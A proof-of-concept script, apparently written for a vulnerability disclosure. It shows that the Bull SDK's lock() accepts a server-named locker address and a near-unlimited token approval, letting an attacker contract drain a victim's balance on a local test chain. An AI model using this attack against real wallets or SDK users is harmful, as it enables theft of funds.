// PoC: Bull SDK lock() trusts the API server's "locker" address + approval amount.
// Threat model (the SDK's own): "the API server is not trusted with your wallet.
// Every transaction it returns is checked before it is sent."
// The SDK's lock() does NOT check: the locker address, the approve amount, the
// locked token/amount/beneficiary/schedule. The guard in #guard() allows an
// approve() to ANY "locker" the server names, up to 2**200-1 — effectively
// unlimited for any real token. A compromised/malicious API server can therefore
// name an attacker contract as the locker and drain the victim's full balance.
//
// This script runs the REAL Bull SDK (bull-sdk.mjs, copied verbatim — see
// README.md for sha256) against a LOCAL Anvil chain + a mock Bull API.
// No real Bull infrastructure, no real funds, no mainnet.
//
//   1. Deploy MockERC20, mint 1,000,000 to the victim.
//   2. Deploy AttackerLocker (attacker contract).
//   3. Victim calls bull.lock({ amount: "100" }) via the REAL SDK.
//      The mock API returns: approve(attackerLocker, 2**200-1) + createLock(...).
//   4. The SDK sends both transactions WITHOUT complaint and returns a lockId.
//   5. The attacker calls drain() and takes the victim's ENTIRE balance.
//
// Expected output: victim 1,000,000 -> 0, attacker 0 -> 1,000,000.
import { readFileSync, writeFileSync } from "node:fs";
import {
  createPublicClient, createWalletClient, defineChain, http, parseAbi,
  formatUnits, parseEther,
} from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { Bull } from "./bull-sdk.mjs";
import { startMockApi } from "./mock-api.mjs";

const ANVIL_RPC = "http://127.0.0.1:8545";
const MOCK_API_PORT = 8787;

const anvil = defineChain({
  id: 31337, name: "anvil",
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  rpcUrls: { default: { http: [ANVIL_RPC] } },
});

const tokenAbi = parseAbi([
  "function mint(address to, uint256 amount)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address to, uint256 amount) returns (bool)",
]);
const lockerAbi = parseAbi([
  "function drain(address token, address victim)",
  "function attacker() view returns (address)",
]);

function loadArtifact(name) {
  const j = JSON.parse(readFileSync(`./chain/out/Mocks.sol/${name}.json`, "utf8"));
  return { abi: j.abi, bytecode: j.bytecode.object };
}

const log = (...a) => console.log(...a);

async function main() {
  const victim = privateKeyToAccount(generatePrivateKey());
  const attacker = privateKeyToAccount(generatePrivateKey());
  const pub = createPublicClient({ chain: anvil, transport: http() });
  const victimWallet = createWalletClient({ account: victim, chain: anvil, transport: http() });
  const attackerWallet = createWalletClient({ account: attacker, chain: anvil, transport: http() });

  // Fund both test accounts directly on Anvil (test-only, local chain).
  await pub.request({ method: "anvil_setBalance", params: [victim.address, "0x21e19e0c9bab2400000"] }); // 10,000 ETH
  await pub.request({ method: "anvil_setBalance", params: [attacker.address, "0xde0b6b3a7640000"] }); // 1 ETH

  // Deploy mocks.
  const tokenArt = loadArtifact("MockERC20");
  const lockerArt = loadArtifact("AttackerLocker");
  const tokenHash = await victimWallet.deployContract({ abi: tokenArt.abi, bytecode: tokenArt.bytecode, args: [] });
  const tokenRc = await pub.waitForTransactionReceipt({ hash: tokenHash });
  const token = tokenRc.contractAddress;
  const lockerHash = await victimWallet.deployContract({ abi: lockerArt.abi, bytecode: lockerArt.bytecode, args: [attacker.address] });
  const lockerRc = await pub.waitForTransactionReceipt({ hash: lockerHash });
  const locker = lockerRc.contractAddress;
  log("token:  ", token);
  log("locker: ", locker, "(attacker contract, named by the mock API)");
  log("victim: ", victim.address);
  log("attacker:", attacker.address);

  // Victim holds 1,000,000 tokens.
  const SUPPLY = 1_000_000n * 10n ** 18n;
  await victimWallet.writeContract({ address: token, abi: tokenAbi, functionName: "mint", args: [victim.address, SUPPLY] });
  const balBefore = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  log("victim balance before:", formatUnits(balBefore, 18));

  // Start the malicious mock Bull API.
  const server = await startMockApi({ port: MOCK_API_PORT, token, locker });
  log("mock Bull API listening on 127.0.0.1:" + MOCK_API_PORT);

  // Run the REAL Bull SDK against the mock API.
  const bull = new Bull({ walletClient: victimWallet, publicClient: pub, baseUrl: `http://127.0.0.1:${MOCK_API_PORT}` });
  log("calling bull.lock({ amount: '100' }) — user intent: lock 100 tokens for 365 days");
  let lockId;
  try {
    lockId = await bull.lock({ token, amount: "100", beneficiary: victim.address, durationDays: 365 });
    log("SDK returned lockId:", lockId, "— NO ERROR, NO WARNING about the tampered approve/locker");
  } catch (e) {
    log("SDK threw (unexpected):", e.message);
    process.exit(2);
  }

  // What did the SDK actually approve? (allowance read AFTER the lock pull,
  // so the granted approval = current allowance + the 100 tokens just pulled.)
  const allowance = await pub.readContract({ address: token, abi: tokenAbi, functionName: "allowance", args: [victim.address, locker] });
  const lockedBal = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [locker] });
  const granted = allowance + lockedBal;
  log("allowance victim -> attacker locker (after lock pull):", allowance.toString());
  log("approval actually granted by SDK:", granted.toString());
  log("tokens actually 'locked' in locker:", formatUnits(lockedBal, 18));
  log("granted == 2**200-1 ?", granted === 2n ** 200n - 1n);

  // Attacker drains the rest of the victim's balance via the approval.
  const drainHash = await attackerWallet.writeContract({ address: locker, abi: lockerAbi, functionName: "drain", args: [token, victim.address] });
  await pub.waitForTransactionReceipt({ hash: drainHash });
  const balAfter = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  const attackerBal = await pub.readContract({ address: token, abi: tokenAbi, functionName: "balanceOf", args: [attacker.address] });
  log("victim balance after drain:", formatUnits(balAfter, 18));
  log("attacker balance after drain:", formatUnits(attackerBal, 18));

  const result = {
    poc: "Bull SDK lock() — server-chosen locker + unbounded approval",
    sdk: "bull-sdk.mjs (verbatim copy of https://www.bull.family/sdk/bull.mjs)",
    victimBalanceBefore: formatUnits(balBefore, 18),
    victimBalanceAfter: formatUnits(balAfter, 18),
    attackerBalanceAfter: formatUnits(attackerBal, 18),
    tokensLockedInAttackerLocker: formatUnits(lockedBal, 18),
    approvalGranted: granted.toString(),
    approvalIsMaxGuard: granted === 2n ** 200n - 1n,
    lockIdReturned: String(lockId),
    // Victim lost 100%: 999,900 drained to the attacker + 100 sitting in the
    // attacker-controlled locker (attacker owns that contract too).
    exploited: balAfter === 0n && attackerBal + lockedBal === SUPPLY,
  };
  writeFileSync("./poc-result.json", JSON.stringify(result, null, 2));
  log("\n=== RESULT ===");
  log(result.exploited ? "EXPLOITED: victim lost 100% of their balance (1,000,000 tokens)." : "NOT EXPLOITED — see poc-result.json");
  log("poc-result.json written.");
  server.close();
  process.exit(result.exploited ? 0 : 1);
}

main().catch((e) => { console.error("PoC crashed:", e); process.exit(3); });
